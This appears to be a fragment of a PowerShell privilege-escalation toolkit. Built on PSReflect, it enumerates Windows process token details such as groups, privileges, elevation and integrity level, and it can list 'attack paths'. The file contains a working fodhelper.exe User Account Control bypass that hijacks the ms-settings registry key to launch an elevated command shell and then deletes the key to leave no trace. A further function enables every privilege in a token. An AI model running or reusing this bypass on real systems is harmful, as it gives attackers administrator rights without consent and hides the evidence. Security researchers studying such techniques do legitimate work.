        [switch]$ShowAttackPaths
    )

    #$TOKEN_QUERY = 0x0008
    $tokAccess = [TOKEN_ACCESS]::TOKEN_QUERY
    #$PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    $procAccess = [PROCESS_ACCESS]::PROCESS_QUERY_LIMITED_INFORMATION
   
    # We open the proccess handle
    $procHandle = Open-ProcessHandle -Id $Id -Access $procAccess

    if ($procHandle -eq [IntPtr]::Zero) {
        Write-Warning "Could not open process $Id"
        return
    }

    # We open the token handle
    $hToken = Open-TokenHandle -ProcessHandle $procHandle -DesiredAccess $tokAccess
    if ([IntPtr]::Zero -eq $hToken) {
        Write-Warning "Failed to open token for process $Id"
        return
    }

    # Acumulators for exploiation paths
    $ownerSidStr = $null
    $primaryGroupSidStr = $null
    $TokenSummaryPrivileges = @()
    $isElevated = $false
    $elevTypeStr = $null
    $linkedHandle = [IntPtr]::Zero
    $TokenIntegrityLabel = $null

    # TokenType
    $typeBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenType"
    if ($typeBuffer) {
        try {
            $tokenType = ([System.Runtime.InteropServices.Marshal]::ReadInt32($typeBuffer) -as $TOKEN_TYPE)

            Write-Host "`n[+] TokenType Info:`n"
            $TokenType | Format-List | Out-Host
        }
        finally {
            Free-TokenBuffer $typeBuffer
        }
    }

    # TokenUser
    $userBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenUser"
    if ($userBuffer) {
        try {
            $TokenUser = $userBuffer -as $TOKEN_USER
            if ($TokenUser) {
                $TokenSummaryUser = [PSCustomObject]@{
                    Sid           = $TokenUser.User.Sid
                    User          = Convert-SID -Ptr $TokenUser.User.Sid
                    Attributes    = if ($TokenUser.User.Attributes -eq 'DISABLED') {
                        'None (no special SID flags)'
                    } else {
                        $TokenUser.User.Attributes
                    }
                }

                Write-Host "`n[+] TokenUser Info:"
                $TokenSummaryUser | Format-List | Out-Host
            }
        }
        finally {
            Free-TokenBuffer $userBuffer
        }
    }

    # TokenLogonSid
    $logonSidBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenLogonSid"
    if ($logonSidBuffer) {
        try {
            $TokenLogonGroups = $logonSidBuffer -as $TOKEN_GROUPS

            if ($TokenLogonGroups) {
                $logonGroupList = @()

                for ($i = 0; $i -lt $TokenLogonGroups.GroupCount; $i++) {
                    $sidPtr = $TokenLogonGroups.Groups[$i].Sid
                    $attrs  = $TokenLogonGroups.Groups[$i].Attributes

                    $logonGroupList += [PSCustomObject]@{
                        Sid        = $sidPtr
                        Name       = Convert-SID -Ptr $sidPtr
                        Attributes = $attrs -as $SE_GROUP
                    }
                }

                $TokenLogonGroups = [PSCustomObject]@{
                    GroupsCount = $TokenLogonGroups.GroupCount
                    Groups      = $logonGroupList
                }
                Write-Host "[+] TokenLogonSid Info:"
                $TokenLogonGroups | Format-List | Out-Host
            }
        }
        finally {
            Free-TokenBuffer $logonSidBuffer
        }
    }

    # TokenStatistics
    $statBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenStatistics"
    if ($statBuffer) {
        try {
            $TokenStatistics = $statBuffer -as $TOKEN_STATISTICS
            if ($TokenStatistics) {
                $TokenSummaryStats = [PSCustomObject]@{
                    TokenId            = $TokenStatistics.TokenId.LowPart
                    AuthenticationId   = $TokenStatistics.AuthenticationId.LowPart
                    TokenType          = [TOKEN_TYPE]::GetName([TOKEN_TYPE], $TokenStatistics.TokenType)
                    ImpersonationLevel = [SECURITY_IMPERSONATION_LEVEL]::GetName([SECURITY_IMPERSONATION_LEVEL], $TokenStatistics.ImpersonationLevel)
                    GroupCount         = $TokenStatistics.GroupCount
                    PrivilegeCount     = $TokenStatistics.PrivilegeCount
                }

                Write-Host "[+] TokenStatistics Info:"
                $TokenSummaryStats | Format-List | Out-Host
            }
        }
        finally {
            Free-TokenBuffer $statBuffer
        }
    }

    # TokenPrimaryGroup
    $primaryGroupBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenPrimaryGroup"
    if ($primaryGroupBuffer) {
        try {
            $primaryGroupStruct = $primaryGroupBuffer -as $TOKEN_PRIMARY_GROUP
            $primaryGroupSidStr = Convert-SID -Ptr $primaryGroupStruct.PrimaryGroup

            Write-Host "[+] TokenPrimaryGroup Info:`n"
            $primaryGroupSidStr | Format-List | Out-Host
        }
        finally {
            Free-TokenBuffer $primaryGroupBuffer
        }
    }

    # TokenOwner
    $ownerBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenOwner"
    if ($ownerBuffer) {
        try {
            $ownerStruct = $ownerBuffer -as $TOKEN_OWNER
            $ownerSidStr = Convert-SID -Ptr $ownerStruct.Owner

            Write-Host "`n[+] TokenOwner Info:`n"
            $ownerSidStr | Format-List | Out-Host
        }
        finally {
            Free-TokenBuffer $ownerBuffer
        }
    }

    # TokenGroups
    $groupBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenGroups"
    if ($groupBuffer) {
        try {
            $TokenGroups = $groupBuffer -as $TOKEN_GROUPS

            if ($TokenGroups) {
                $groupList = @()

                for ($i = 0; $i -lt $TokenGroups.GroupCount; $i++) {
                    $sidPtr = $TokenGroups.Groups[$i].Sid
                    $attrs  = $TokenGroups.Groups[$i].Attributes

                    $groupList += [PSCustomObject]@{
                        Sid        = $sidPtr
                        Name       = Convert-SID -Ptr $sidPtr
                        Attributes = $attrs -as $SE_GROUP
                    }
                }

                $TokenSummaryGroups = [PSCustomObject]@{
                    GroupsCount = $TokenGroups.GroupCount
                    Groups      = $groupList
                }
                Write-Host "`n[+] TokenGroups Info:"  
                $TokenSummaryGroups | Format-List | Out-Host
            }
        }
        finally {
            Free-TokenBuffer $groupBuffer
        }
    }

    # TokenPrivileges
    $privBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenPrivileges"
    if ($privBuffer) {
        try {
            $TokenPrivs = $privBuffer -as $TOKEN_PRIVILEGES

            if ($TokenPrivs) {
                $TokenSummaryPrivileges = @()

                for ($i = 0; $i -lt $TokenPrivs.PrivilegeCount; $i++) {
                    $privilege = $TokenPrivs.Privileges[$i].Luid.LowPart
                    $attrs  = $TokenPrivs.Privileges[$i].Attributes

                    $TokenSummaryPrivileges += [PSCustomObject]@{
                        Privilege  = $privilege
                        Attributes = $attrs
                    }
                    if ($name -and ($attrs.ToString() -match 'ENABLED')) { $enabledPrivilegeNames += $name }
                }
                $TokenSummaryPrivileges = $TokenSummaryPrivileges | Sort-Object { $_.Attributes -match 'ENABLED' } -Descending
                Write-Host "[+] TokenPrivileges Info:"
                $TokenSummaryPrivileges | Format-List | Out-Host
            }
        }
        finally {
            Free-TokenBuffer $privBuffer
        }
    }

    # TokenUIAccess
    $uiAccessBuf = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenUIAccess"
    if ($uiAccessBuf) {
        try {
            $TokenUIAccess = (([Runtime.InteropServices.Marshal]::ReadInt32($uiAccessBuf)) -ne 0)
        }
        finally {
            Free-TokenBuffer $uiAccessBuf
        }
    }

    # TokenElevation
    $elevBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenElevation"
    if ($elevBuffer) {
        try {
            $TokenElevation = $elevBuffer -as $TOKEN_ELEVATION
            $isElevated = ($TokenElevation.TokenIsElevated -ne 0)

            Write-Host "[+] TokenElevation Info:"
            Write-Host "`nTokenIsElevated: $isElevated`n"
        }
        finally {
            Free-TokenBuffer $elevBuffer
        }
    }

    # TokenElevationType
    $elevTypeBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenElevationType"
    if ($elevTypeBuffer) {
        try {
            $TokenElevationType = ([System.Runtime.InteropServices.Marshal]::ReadInt32($elevTypeBuffer)) -as $TOKEN_ELEVATION_TYPE
            $elevTypeStr = $TokenElevationType.ToString()
        
            Write-Host "[+] TokenElevationType Info:`n"
            Write-Host "$TokenElevationType`n"
        }
        finally {
            Free-TokenBuffer $elevTypeBuffer
        }
    }

    # TokenIntegrityLevel
    $integrityLevelBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenIntegrityLevel"
    if ($integrityLevelBuffer) {
        try {
            $TokenIntegrity = $integrityLevelBuffer -as $TOKEN_MANDATORY_LABEL
            $TokenIntegritySid = $TokenIntegrity.Label.Sid
            $SidString = ''
            $Success = $Advapi32::ConvertSidToStringSid($TokenIntegritySid, [ref]$SidString)
            if ($Success -eq 1) {
                $TokenIntegritySid = $SidString
                $rid    = [uint32]($TokenIntegritySid.Split('-')[-1])
                $TokenIntegrityLabel = [enum]::GetName($INTEGRITY_LEVELS, $rid)
            
                Write-Host "[+] TokenIntegrityLevel Info:`n"
                Write-Host "$TokenIntegrityLabel ($TokenIntegritySid)`n"
            }
        }
        finally {
            Free-TokenBuffer $integrityLevelBuffer
        }
    }

    # TokenLinkedToken
    $linkedBuffer = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenLinkedToken"
    if ($linkedBuffer) {
        try {
            $TokenLinked = $linkedBuffer -as $TOKEN_LINKED_TOKEN
            $linkedHandle = $TokenLinked.LinkedToken

            Write-Host "[+] TokenLinkedToken Info:`n"
            Write-Host ("LinkedToken: {0}" -f $linkedHandle)
        }
        finally {
            Free-TokenBuffer $linkedBuffer
        }
    }

    # Exploitation paths if chosen to be shown
    if ($ShowAttackPaths) {
        Show-TokenCapabilities `
            -OwnerSidStr $ownerSidStr `
            -PrimaryGroupSidStr $primaryGroupSidStr `
            -TokenSummaryPrivileges $TokenSummaryPrivileges `
            -IsElevated $isElevated `
            -ElevationTypeStr $elevTypeStr `
            -LinkedHandle $linkedHandle `
            -IntegrityLabel $TokenIntegrityLabel `
            -TokenSummaryGroups $TokenSummaryGroups `
            -TokenSummaryStats $TokenSummaryStats `
            -TokenLogonGroups $TokenLogonGroups `
            -TokenUIAccess $TokenUIAccess `
            -TokenType $tokenType
    }
    
    Close-Token $hToken
}

function FodhelperUACBypass(){ 
<#
.SYNOPSIS  
    This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe

    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform an UAC bypass to start any application. 

.EXAMPLE  

     Load "C:\Windows\System32\cmd.exe" (it's default):
     FodhelperBypass 

#>

    # Bypass UAC script using fodhelper.exe
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"

    # Generate random name
    $randomName = "new$((Get-Random -Minimum 1000 -Maximum 9999))"
    $destPath = "C:\Users\$env:USERNAME\$randomName"

    # Crear carpeta destino si no existe
    if (!(Test-Path $destPath)) {
        New-Item -ItemType Directory -Path $destPath | Out-Null
    }

    Write-Host "[+] Creating registry key..."
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value "$destPath\$randomName.exe" -Force
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null

    # Copy cmd.exe with auto-generated random name
    Copy-Item -Path "C:\Windows\System32\cmd.exe" -Destination "$destPath\$randomName.exe" -Force

    Write-Host "[+] Running fodhelper.exe (you should see an elevated CMD)..."
    Start-Process "C:\Windows\System32\fodhelper.exe"

    Start-Sleep -Seconds 5

    Write-Host "[+] Cleaning registry key to not leave any trace..."
    Remove-Item -Path $regPath -Recurse -Force

    Write-Host "[+] Process completed. Verify it launched a CMD as admin."

}


function Enable-TokenAllPrivileges {
    [CmdletBinding()]
    param(
        [Alias('ProcId','ProcessId')]
        [UInt32]$Id = $PID,
        [switch]$UseLinked,
        [switch]$UseThread
    )

    $proc  = Open-ProcessHandle -Id $Id -Access ([PROCESS_ACCESS]::PROCESS_QUERY_LIMITED_INFORMATION)
    if ($proc -eq [IntPtr]::Zero) { throw "OpenProcess falló para PID $Id" }

    $tokAccess = [TOKEN_ACCESS]([TOKEN_ACCESS]::TOKEN_QUERY -bor [TOKEN_ACCESS]::TOKEN_ADJUST_PRIVILEGES)
    $hToken = Open-TokenHandle -ProcessHandle $proc -DesiredAccess $tokAccess -UseLinked:$UseLinked -UseThread:$UseThread
    if ($hToken -eq [IntPtr]::Zero) { if ($Id -ne $PID) { Close-Token $proc }; throw "No se pudo abrir el token." }

    # Initialize map for tracking which one has been changed
    $beforeMap = @{}

    try {
        # Snapshot BEFORE
        $tokenPrivBuff = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenPrivileges"
        if ($tokenPrivBuff) {
            try {
                $tokenPriv = $tokenPrivBuff -as $TOKEN_PRIVILEGES
                for ($i=0; $i -lt $tokenPriv.PrivilegeCount; $i++) {
                    $l   = $tokenPriv.Privileges[$i]
                    $key = "$($l.Luid.HighPart):$($l.Luid.LowPart)"
                    $beforeMap[$key] = $l.Attributes
                }
            } finally {
                [Runtime.InteropServices.Marshal]::FreeHGlobal($tokenPrivBuff)
            }
        }

        # Read an build batch ENABLED
        $buf = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenPrivileges"
        if (-not $buf) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            return [pscustomobject]@{ Total=0; AdjustOk=$false; Win32Err=$err; NotAllAssigned=$false; Details=@() }
        }

        $count = 0; $len = 0; $pNew = [IntPtr]::Zero
        try {
            $tp = $buf -as $TOKEN_PRIVILEGES
            if (-not $tp -or $tp.PrivilegeCount -le 0) {
                return [pscustomobject]@{ Total=0; AdjustOk=$true; Win32Err=0; NotAllAssigned=$false; Details=@() }
            }

            $count = [int]$tp.PrivilegeCount
            $len   = 4 + (12 * $count)
            $pNew  = [Runtime.InteropServices.Marshal]::AllocHGlobal($len)

            [Runtime.InteropServices.Marshal]::WriteInt32($pNew, 0, $count)
            $off = 4
            for ($i=0; $i -lt $count; $i++) {
                $luid = $tp.Privileges[$i].Luid
                [Runtime.InteropServices.Marshal]::WriteInt32($pNew, $off + 0, $luid.LowPart)
                [Runtime.InteropServices.Marshal]::WriteInt32($pNew, $off + 4, $luid.HighPart)
                [Runtime.InteropServices.Marshal]::WriteInt32($pNew, $off + 8, [int][SE_PRIVILEGE]::ENABLED)
                $off += 12
            }

            $null = $Advapi32::AdjustTokenPrivileges($hToken, $false, $pNew, [uint32]$len, [IntPtr]::Zero, [ref]([UInt32]0))
            $err  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $result = [pscustomobject]@{
                Total          = $count
                AdjustOk       = ($err -eq 0 -or $err -eq 1300)  # 1300 = ERROR_NOT_ALL_ASSIGNED
                Win32Err       = $err
                NotAllAssigned = ($err -eq 1300)
                Details        = @()
            }

            # Snapshot AFTER y diff per privilege
            $newTokenPrivBuff = Get-TokenInformation -TokenHandle $hToken -InformationType "TokenPrivileges"
            if ($newTokenPrivBuff) {
                try {
                    $newTokenPriv = $newTokenPrivBuff -as $TOKEN_PRIVILEGES
                    $rows = @()
                    for ($i=0; $i -lt $newTokenPriv.PrivilegeCount; $i++) {
                        $la   = $newTokenPriv.Privileges[$i]
                        $key  = "$($la.Luid.HighPart):$($la.Luid.LowPart)"

                        $prev = $null
                        if ($beforeMap.Count -gt 0 -and $beforeMap.ContainsKey($key)) { $prev = $beforeMap[$key] }

                        $now  = $la.Attributes
                        $rows += [pscustomobject]@{
                            LuidHigh   = $la.Luid.HighPart
                            LuidLow    = $la.Luid.LowPart
                            WasEnabled = ($prev -and ($prev.ToString() -match 'ENABLED'))
                            NowEnabled = ($now.ToString()  -match 'ENABLED')
                            Changed    = ($prev -ne $now)
                        }
                    }
                    $result.Details = $rows
                } finally {
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($newTokenPrivBuff)
                }
            }

            return $result
        }
        finally {
            if ($pNew -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($pNew) }
            [Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
        }
    }
    finally {
        Close-Token $hToken
        if ($Id -ne $PID) { Close-Token $proc }
    }
}

# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PrivEsc

#region Enums

$LUID_ATTRIBUTES = psenum $Module LUID_ATTRIBUTES UInt32 @{

    DISABLED                        = 0x00000000
    SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
    SE_PRIVILEGE_ENABLED            = 0x00000002
    SE_PRIVILEGE_REMOVED            = 0x00000004
    SE_PRIVILEGE_USED_FOR_ACCESS    = 2147483648
} -Bitfield

$PROCESS_ACCESS = psenum $Module PROCESS_ACCESS UInt32 @{
    PROCESS_TERMINATE                 = 0x00000001
    PROCESS_CREATE_THREAD             = 0x00000002
    PROCESS_VM_OPERATION              = 0x00000008
    PROCESS_VM_READ                   = 0x00000010
    PROCESS_VM_WRITE                  = 0x00000020
    PROCESS_DUP_HANDLE                = 0x00000040
    PROCESS_CREATE_PROCESS            = 0x00000080
    PROCESS_SET_QUOTA                 = 0x00000100
    PROCESS_SET_INFORMATION           = 0x00000200
    PROCESS_QUERY_INFORMATION         = 0x00000400
    PROCESS_SUSPEND_RESUME            = 0x00000800
    PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
    DELETE                            = 0x00010000
    READ_CONTROL                      = 0x00020000
    WRITE_DAC                         = 0x00040000
    WRITE_OWNER                       = 0x00080000
    SYNCHRONIZE                       = 0x00100000
    PROCESS_ALL_ACCESS                = 0x001f1ffb
} -Bitfield

$SE_GROUP = psenum $Module SE_GROUP UInt32 @{
    DISABLED           = 0x00000000
    MANDATORY          = 0x00000001
    ENABLED_BY_DEFAULT = 0x00000002
    ENABLED            = 0x00000004
    OWNER              = 0x00000008
    USE_FOR_DENY_ONLY  = 0x00000010
    INTEGRITY          = 0x00000020
    INTEGRITY_ENABLED  = 0x00000040
    RESOURCE           = 0x20000000
    LOGON_ID           = 3221225472
} -Bitfield

$SE_PRIVILEGE = psenum $Module SE_PRIVILEGE UInt32 @{
    DISABLED           = 0x00000000
    ENABLED_BY_DEFAULT = 0x00000001
    ENABLED            = 0x00000002
    REMOVED            = 0x00000004
    USED_FOR_ACCESS    = 2147483648
} -Bitfield

$SECURITY_IMPERSONATION_LEVEL = psenum $Module SECURITY_IMPERSONATION_LEVEL UInt32 @{
    SecurityAnonymous      = 0
    SecurityIdentification = 1
    SecurityImpersonation  = 2
    SecurityDelegation     = 3
}

$SECURITY_ENTITY = psenum $Module SECURITY_ENTITY UInt32 @{
    SeCreateTokenPrivilege          = 1
    SeAssignPrimaryTokenPrivilege   = 2
    SeLockMemoryPrivilege           = 3
    SeIncreaseQuotaPrivilege        = 4
    SeUnsolicitedInputPrivilege     = 5
    SeMachineAccountPrivilege       = 6
    SeTcbPrivilege                  = 7
    SeSecurityPrivilege             = 8
    SeTakeOwnershipPrivilege        = 9
    SeLoadDriverPrivilege           = 10
    SeSystemProfilePrivilege        = 11
    SeSystemtimePrivilege           = 12
    SeProfileSingleProcessPrivilege = 13
    SeIncreaseBasePriorityPrivilege = 14
    SeCreatePagefilePrivilege       = 15
    SeCreatePermanentPrivilege      = 16
    SeBackupPrivilege               = 17
    SeRestorePrivilege              = 18
    SeShutdownPrivilege             = 19
    SeDebugPrivilege                = 20
    SeAuditPrivilege                = 21
    SeSystemEnvironmentPrivilege    = 22
    SeChangeNotifyPrivilege         = 23
    SeRemoteShutdownPrivilege       = 24
    SeUndockPrivilege               = 25
    SeSyncAgentPrivilege            = 26
    SeEnableDelegationPrivilege     = 27
    SeManageVolumePrivilege         = 28
    SeImpersonatePrivilege          = 29
    SeCreateGlobalPrivilege         = 30
    SeTrustedCredManAccessPrivilege = 31
    SeRelabelPrivilege              = 32
    SeIncreaseWorkingSetPrivilege   = 33
    SeTimeZonePrivilege             = 34
    SeCreateSymbolicLinkPrivilege   = 35
}

$THREAD_ACCESS = psenum $Module THREAD_ACCESS UInt32 @{
    THREAD_TERMINATE                 = 0x00000001
    THREAD_SUSPEND_RESUME            = 0x00000002
    THREAD_GET_CONTEXT               = 0x00000008
    THREAD_SET_CONTEXT               = 0x00000010
    THREAD_SET_INFORMATION           = 0x00000020
    THREAD_QUERY_INFORMATION         = 0x00000040
    THREAD_SET_THREAD_TOKEN          = 0x00000080
    THREAD_IMPERSONATE               = 0x00000100
    THREAD_DIRECT_IMPERSONATION      = 0x00000200
    THREAD_SET_LIMITED_INFORMATION   = 0x00000400
    THREAD_QUERY_LIMITED_INFORMATION = 0x00000800
    DELETE                           = 0x00010000
    READ_CONTROL                     = 0x00020000
    WRITE_DAC                        = 0x00040000
    WRITE_OWNER                      = 0x00080000
    SYNCHRONIZE                      = 0x00100000
    THREAD_ALL_ACCESS                = 0x001f0ffb
} -Bitfield

$TOKEN_ACCESS = psenum $Module TOKEN_ACCESS UInt32 @{
    TOKEN_DUPLICATE          = 0x00000002
    TOKEN_IMPERSONATE        = 0x00000004
    TOKEN_QUERY              = 0x00000008
    TOKEN_QUERY_SOURCE       = 0x00000010
    TOKEN_ADJUST_PRIVILEGES  = 0x00000020
    TOKEN_ADJUST_GROUPS      = 0x00000040
    TOKEN_ADJUST_DEFAULT     = 0x00000080
    TOKEN_ADJUST_SESSIONID   = 0x00000100
    DELETE                   = 0x00010000
    READ_CONTROL             = 0x00020000
    WRITE_DAC                = 0x00040000
    WRITE_OWNER              = 0x00080000
    SYNCHRONIZE              = 0x00100000
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    TOKEN_ALL_ACCESS         = 0x001f01ff
} -Bitfield

$TOKEN_ELEVATION_TYPE = psenum $Module TOKEN_ELEVATION_TYPE UInt32 @{ 
    TokenElevationTypeDefault = 1
    TokenElevationTypeFull    = 2
    TokenElevationTypeLimited = 3
}

$TOKEN_INFORMATION_CLASS = psenum $Module TOKEN_INFORMATION_CLASS UInt16 @{ 
    TokenUser                            = 1
    TokenGroups                          = 2
    TokenPrivileges                      = 3
    TokenOwner                           = 4
    TokenPrimaryGroup                    = 5
    TokenDefaultDacl                     = 6
    TokenSource                          = 7
    TokenType                            = 8
    TokenImpersonationLevel              = 9
    TokenStatistics                      = 10
    TokenRestrictedSids                  = 11
    TokenSessionId                       = 12
    TokenGroupsAndPrivileges             = 13
    TokenSessionReference                = 14
    TokenSandBoxInert                    = 15
    TokenAuditPolicy                     = 16
    TokenOrigin                          = 17
    TokenElevationType                   = 18
    TokenLinkedToken                     = 19
    TokenElevation                       = 20
    TokenHasRestrictions                 = 21
    TokenAccessInformation               = 22
    TokenVirtualizationAllowed           = 23
    TokenVirtualizationEnabled           = 24
    TokenIntegrityLevel                  = 25
    TokenUIAccess                        = 26
    TokenMandatoryPolicy                 = 27
    TokenLogonSid                        = 28
    TokenIsAppContainer                  = 29
    TokenCapabilities                    = 30
    TokenAppContainerSid                 = 31
    TokenAppContainerNumber              = 32
    TokenUserClaimAttributes             = 33
    TokenDeviceClaimAttributes           = 34
    TokenRestrictedUserClaimAttributes   = 35
    TokenRestrictedDeviceClaimAttributes = 36
    TokenDeviceGroups                    = 37
    TokenRestrictedDeviceGroups          = 38
    TokenSecurityAttributes              = 39
    TokenIsRestricted                    = 40
    MaxTokenInfoClass                    = 41
}

$TOKEN_MANDATORY_POLICY = psenum $Module TOKEN_MANDATORY_POLICY UInt32 @{
    OFF                    = 0x0
    NO_WRITE_UP            = 0x1
    POLICY_NEW_PROCESS_MIN = 0x2
    POLICY_VALID_MASK      = 0x3
}

$TOKEN_TYPE = psenum $Module TOKEN_TYPE UInt32 @{
    TokenPrimary       = 1
    TokenImpersonation = 2
}

$INTEGRITY_LEVELS = psenum $Module INTEGRITY_LEVELS UInt32 @{
    UNTRUSTED         = 0
    LOW               = 4096
    MEDIUM            = 8192
    MEDIUM_PLUS       = 8448
    HIGH              = 12288
    SYSTEM            = 16384
    PROTECTED_PROCESS = 20480
    SECURE_PROCESS    = 28672
}

#endregion Enums

#region Structs

$ACL = struct $Module ACL @{
    AclRevision = field 0 Byte
    Sbz1        = field 1 Byte
    AclSize     = field 2 UInt16
    AceCount    = field 3 UInt16
    Sbz2        = field 4 UInt16
}

$LUID = struct $Module LUID @{
    LowPart  = field 0 $SECURITY_ENTITY
    HighPart = field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module LUID_AND_ATTRIBUTES @{
    Luid       = field 0 $LUID
    Attributes = field 1 $SE_PRIVILEGE
}

$SID_AND_ATTRIBUTES = struct $Module SID_AND_ATTRIBUTES @{
    Sid        = field 0 IntPtr
    Attributes = field 1 $SE_GROUP
} -PackingSize Size8

$TOKEN_APPCONTAINER_INFORMATION = struct $Module TOKEN_APPCONSTAINER_INFORMATION @{
    TokenAppContainer = field 0 IntPtr
}

$TOKEN_DEFAULT_DACL = struct $Module TOKEN_DEFAULT_DACL @{
    DefaultDacl = field 0 $ACL
}

$TOKEN_ELEVATION = struct $Module TOKEN_ELEVATION @{
    TokenIsElevated = field 0 UInt32
}

$TOKEN_GROUPS = struct $Module TOKEN_GROUPS @{
    GroupCount = field 0 UInt32
    Groups     = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs ('ByValArray', 50)
}

$TOKEN_GROUPS_AND_PRIVILEGES = struct $Module TOKEN_GROUPS_AND_PRIVILEGES @{
    SidCount            = field 0 UInt32
    SidLength           = field 1 UInt32
    Sids                = field 2 IntPtr
    RestrictedSidCount  = field 3 UInt32
    RestrictedSidLength = field 4 UInt32
    RestrictedSids      = field 5 IntPtr
    PrivilegeCount      = field 6 UInt32
    PrivilegeLength     = field 7 UInt32
    Privileges          = field 8 IntPtr
    AuthenticationId    = field 9 $LUID
}

$TOKEN_LINKED_TOKEN = struct $Module TOKEN_LINKED_TOKEN @{
    LinkedToken = field 0 IntPtr
}

$TOKEN_MANDATORY_LABEL = struct $Module TOKEN_MANDATORY_LABEL @{
    Label = field 0 $SID_AND_ATTRIBUTES
}

$TOKEN_MANDATORY_POLICY = struct $Module TOKEN_MANDATORY_POLICY @{
    Policy = field 0 $TOKEN_MANDATORY_POLICY
}

$TOKEN_OWNER = struct $Module TOKEN_OWNER @{
    Owner = field 0 IntPtr
}

$TOKEN_PRIVILEGES = struct $Module TOKEN_PRIVILEGES @{
    PrivilegeCount = field 0 UInt32
    Privileges     = field 1  $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$TOKEN_SOURCE = struct $Module TOKEN_SOURCE @{
    SourceName       = field 0 string
    SourceIdentifier = field 1 $LUID
}

$TOKEN_STATISTICS = struct $Module TOKEN_STATISTICS @{
    TokenId            = field 0 $LUID
    AuthenticationId   = field 1 $LUID
    ExpirationTime     = field 2 UInt64
    TokenType          = field 3 $TOKEN_TYPE
    ImpersonationLevel = field 4 $SECURITY_IMPERSONATION_LEVEL
    DynamicCharged     = field 5 UInt32
    DynamicAvailable   = field 6 UInt32
    GroupCount         = field 7 UInt32
    PrivilegeCount     = field 8 UInt32
    ModifiedId         = field 9 $LUID
}

$TOKEN_USER = struct $Module TOKEN_USER @{
    User = field 0 $SID_AND_ATTRIBUTES
}

$TOKEN_PRIMARY_GROUP = struct $Module TOKEN_PRIMARY_GROUP @{
    PrimaryGroup = field 0 IntPtr
}

#endregion Structs

#region FunctionDefinitions

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 GetCurrentThread ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 OpenThreadToken ([Bool]) @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 AdjustTokenPrivileges ([Bool]) @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [UInt32].MakeByRefType()) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PrivEsc'
$Kernel32 = $Types['kernel32']
$Advapi32 = $Types['advapi32']